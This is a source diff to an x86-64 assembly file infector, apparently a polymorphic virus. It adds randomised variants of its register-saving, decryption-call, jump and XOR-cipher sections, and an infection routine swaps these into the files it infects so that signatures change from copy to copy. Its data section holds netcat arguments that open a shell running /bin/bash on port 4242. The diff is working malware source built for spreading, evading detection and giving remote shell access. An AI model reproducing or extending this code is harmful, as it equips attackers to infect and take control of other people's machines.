@@ -9,19 +9,48 @@ _start:
 
 begin:
 	; save all registers
-POLY_push_regs_begin:
-	push rax
-POLY_push_regs_end:
-	push rdi
-	push rsi
-	push rdx
-	push rcx
-	push rbx
-	push r8
-	push r9
-	push r10
+POLY_save_register_begin:
 	push r11
+	push rax
+	pop r11
+	pop rax
 
+	push r10
+	push rdi
+	pop r10
+	pop rdi
+
+	push r9
+	push rsi
+	pop r9
+	pop rsi
+
+	push r8
+	push rdx
+	pop r8
+	pop rdx
+
+	push rbx
+	push rcx
+	pop rbx
+	pop rcx
+
+	sub rsp, 80
+	mov [rsp + 32], rcx
+	mov [rsp + 48], r8
+	mov [rsp + 8], rdi
+	mov [rsp + 16], rsi
+	mov [rsp + 40], rbx
+	mov [rsp + 56], r9
+	mov [rsp], rax
+	mov [rsp + 24], rdx
+	mov [rsp + 72], r11
+	mov [rsp + 64], r10
+POLY_save_register_end:
+
+	nop						; Needed because of script bug about two labels following
+
+POLY_call_uncipher_begin:
 	; uncipher first part of the code
 	lea rdi, [rel program_entry]			; data = &program_entry
 	mov rsi, obfuscation_begin - program_entry	; size = obfuscation_begin - program_entry
@@ -30,43 +59,58 @@ POLY_push_regs_end:
 	cmp rcx, 0					; if (key_size == 0)
 	je program_entry				; 	goto program_entry
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
+POLY_call_uncipher_end:
 
-	jmp program_entry				; goto program_entry
+	nop						; Needed because of script bug about two labels following
 
+POLY_jmp_program_entry_begin:
+	cmp rax, rax
+	je program_entry				; goto program_entry
+POLY_jmp_program_entry_end:
+
+	nop						; Needed because of script bug about two labels following
+
+POLY_xor_cipher_begin:
 ; void xor_cipher(char *data, int size, char *key, int key_size);
 ; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
 xor_cipher:
-	push rcx					; save key_size
-	push rdx					; save key
+	xor r8, r8					; i_key = 0;
+	push rbp				; nop
+	pop rbp					; ...
+	xor r9, r9					; i_data = 0;
 
 	.loop:
-		cmp rsi, 0				; if (size == 0)
+		cmp r9, rsi, 			; if (i_data == size)
 		je .end					; 	goto .end
 
-		mov al, [rdi]				; al = *data
-		mov bl, [rdx]				; bl = *key
+		mov r10, rdx			; cur_key_ptr = key
+		add r10, r8				; + i_key;
+		mov bl, [r10]			; bl = *cur_key_ptr
+
+		mov r10, rdi			; cur_data_ptr = data
+		add r10, r9				; + i_data;
+		push rbp				; nop
+		pop rbp					; ...
+		mov al, [r10]			; al = *cur_data_ptr
+
 		xor al, bl				; al ^= bl
-		mov [rdi], al				; *data = al
+		mov [r10], al			; *cur_data_ptr = al
 
-		inc rdi					; data++
-		inc rdx					; key++
-		dec rsi					; size--
-		dec rcx					; key_size--
+		inc r8					; i_key++;
+		inc r9					; i_data++;
 
-		cmp rcx, 0				; if (key_size == 0)
-		je .key_reset				; 	goto .key_reset
+		cmp r8, rcx,			; if (i_key == key_size)
+		je .key_reset			; 	goto .key_reset
 
 		jmp .loop				; goto .loop
 
 	.key_reset:
-		mov rdx, [rsp]				; restore key
-		mov rcx, [rsp + 8]			; ...
+		xor r8, r8				; restore key
 		jmp .loop				; goto .loop
 
 	.end:
-		pop rdx					; reset stack
-		pop rcx					; ...
 		ret					; return
+POLY_xor_cipher_end:
 ; TODO end transformable section
 
 key: times KEY_SIZE dq 0x0
@@ -525,9 +569,18 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-poly_push_regs_buffer: db 0x00				; Will be replaced by a script
-poly_push_regs_size: dq 0				; Will be replaced by a script
-poly_push_regs_count: dq 0				; Will be replaced by a script
+poly_save_register_buffer: db 0x00			; Will be replaced by a script
+poly_save_register_size: dq 0				; Will be replaced by a script
+poly_save_register_count: dq 0				; Will be replaced by a script
+poly_call_uncipher_buffer: db 0x00			; Will be replaced by a script
+poly_call_uncipher_size: dq 0				; Will be replaced by a script
+poly_call_uncipher_count: dq 0				; Will be replaced by a script
+poly_jmp_program_entry_buffer: db 0x00			; Will be replaced by a script
+poly_jmp_program_entry_size: dq 0			; Will be replaced by a script
+poly_jmp_program_entry_count: dq 0			; Will be replaced by a script
+poly_xor_cipher_buffer: db 0x00			; Will be replaced by a script
+poly_xor_cipher_size: dq 0			; Will be replaced by a script
+poly_xor_cipher_count: dq 0			; Will be replaced by a script
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
@@ -1000,19 +1053,61 @@ treat_file:
 	add rdi, key_size - _start			; 	+ (key_size - _start)
 	mov qword [rdi], KEY_BYTE_SIZE			; *_key_size_ptr = KEY_BYTE_SIZE;
 
-	; replace injected push_regs by a random poly_push_regs
-	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_push_regs_count, poly_push_regs_size, poly_push_regs_buffer);
+	; replace injected save_register by a random poly_save_register
+	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_save_register_count, poly_save_register_size, poly_save_register_buffer);
 	mov rsi, [rand_index]				; ...
-	mov rdx, [rel poly_push_regs_count]			; ...
-	mov rcx, [rel poly_push_regs_size]			; ...
-	lea r8, [rel poly_push_regs_buffer]			; ...
+	mov rdx, [rel poly_save_register_count]		; ...
+	mov rcx, [rel poly_save_register_size]		; ...
+	lea r8, [rel poly_save_register_buffer]		; ...
 	call get_variation_ptr				; ...
 	mov rsi, rax					; ...
-	mov rdi, [mappedfile]				; _poly_push_regs_ptr = file_map
+	mov rdi, [mappedfile]				; _poly_save_register_ptr = file_map
 	add rdi, [filesize]				; 	+ filesize
-	add rdi, POLY_push_regs_begin - _start		; 	+ (.POLY_push_regs_begin - _start)
-	mov rcx, [rel poly_push_regs_size]		; _poly_push_regs_size = poly_push_regs_size;
-	rep movsb					; memcpy(_poly_push_regs_ptr, variation_ptr, _poly_push_regs_size);
+	add rdi, POLY_save_register_begin - _start	; 	+ (.POLY_save_register_begin - _start)
+	mov rcx, [rel poly_save_register_size]		; _poly_save_register_size = poly_save_register_size;
+	rep movsb					; memcpy(_poly_save_register_ptr, variation_ptr, _poly_save_register_size);
+
+	; replace injected call_uncipher by a random poly_call_uncipher
+	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_call_uncipher_count, poly_call_uncipher_size, poly_call_uncipher_buffer);
+	mov rsi, [rand_index]				; ...
+	mov rdx, [rel poly_call_uncipher_count]		; ...
+	mov rcx, [rel poly_call_uncipher_size]		; ...
+	lea r8, [rel poly_call_uncipher_buffer]		; ...
+	call get_variation_ptr				; ...
+	mov rsi, rax					; ...
+	mov rdi, [mappedfile]				; _poly_call_uncipher_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, POLY_call_uncipher_begin - _start	; 	+ (.POLY_call_uncipher_begin - _start)
+	mov rcx, [rel poly_call_uncipher_size]		; _poly_call_uncipher_size = poly_call_uncipher_size;
+	rep movsb					; memcpy(_poly_call_uncipher_ptr, variation_ptr, _poly_call_uncipher_size);
+
+	; replace injected jmp_program_entry by a random poly_jmp_program_entry
+	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_jmp_program_entry_count, poly_jmp_program_entry_size, poly_jmp_program_entry_buffer);
+	mov rsi, [rand_index]				; ...
+	mov rdx, [rel poly_jmp_program_entry_count]	; ...
+	mov rcx, [rel poly_jmp_program_entry_size]	; ...
+	lea r8, [rel poly_jmp_program_entry_buffer]	; ...
+	call get_variation_ptr				; ...
+	mov rsi, rax					; ...
+	mov rdi, [mappedfile]				; _poly_jmp_program_entry_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, POLY_jmp_program_entry_begin - _start	; 	+ (.POLY_jmp_program_entry_begin - _start)
+	mov rcx, [rel poly_jmp_program_entry_size]	; _poly_jmp_program_entry_size = poly_jmp_program_entry_size;
+	rep movsb					; memcpy(_poly_jmp_program_entry_ptr, variation_ptr, _poly_jmp_program_entry_size);
+
+	; replace injected xor_cipher by a random poly_xor_cipher
+	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_xor_cipher_count, poly_xor_cipher_size, poly_xor_cipher_buffer);
+	mov rsi, [rand_index]				; ...
+	mov rdx, [rel poly_xor_cipher_count]		; ...
+	mov rcx, [rel poly_xor_cipher_size]		; ...
+	lea r8, [rel poly_xor_cipher_buffer]		; ...
+	call get_variation_ptr				; ...
+	mov rsi, rax					; ...
+	mov rdi, [mappedfile]				; _poly_xor_cipher_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, POLY_xor_cipher_begin - _start	; 	+ (.POLY_xor_cipher_begin - _start)
+	mov rcx, [rel poly_xor_cipher_size]		; _poly_xor_cipher_size = poly_xor_cipher_size;
+	rep movsb					; memcpy(_poly_xor_cipher_ptr, variation_ptr, _poly_xor_cipher_size);
 
 	; xor cipher all injected bytes between obfuscation_begin and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (obfuscation_begin - _start);
